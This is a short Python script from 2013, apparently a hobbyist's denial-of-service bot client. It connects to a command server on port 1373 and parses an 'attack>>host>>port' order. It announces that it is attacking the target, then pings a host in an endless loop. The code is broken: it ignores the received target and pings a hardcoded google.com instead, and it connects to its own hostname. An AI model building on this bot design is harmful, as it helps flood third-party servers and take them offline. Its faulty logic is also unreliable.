###########################################################################
# MM          MM            HH      HH                  CCCCCCC  EEEEEEEE #
# MMMMM     MMMM  rr  rr    HH      HH     ssss        C         E        #
# MM  MM  MM  MM  rrrr  rr  HHHHHHHHHH  ss            C          EEEEEEEE #
# MM    MM    MM  rrr       HHHHHHHHHH    s           C          EEEEEEEE #
# MM          MM  rr        HH      HH     s  ss       C         E        #
# MM          MM  rr        HH      HH  sssss           CCCCCCC  EEEEEEEE #
###########################################################################
##                        Written in python 3.3
'''Program number: 59 Date: 9/3/2013 DtD: 1065 Copyright:(c)MrHs 2013'''

import socket
import subprocess

client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

#*****Constants
host=""  #This host address should be changed based on the adress of the server 
port=1373
#*****/Constants


client.connect((socket.gethostname(),1373))


attack=(client.recv(2**10)).decode()
#Attck consists of : "attack>>"  +  attckHost  +  ">>"  +  attackPort
if attack:
    attackHost=attack.partition(">>")[2].partition(">>")[0]
    attackPort=attack.partition(">>")[2].partition(">>")[2]
    print(str(socket.gethostname())+" is attacking "+str(attackHost)+ " through port "+str(attackPort))
    
    #Here the ping process takes place
    host="www.google.com"
    while 1:
        ping=subprocess.call('ping google.com')
        




#Comment :
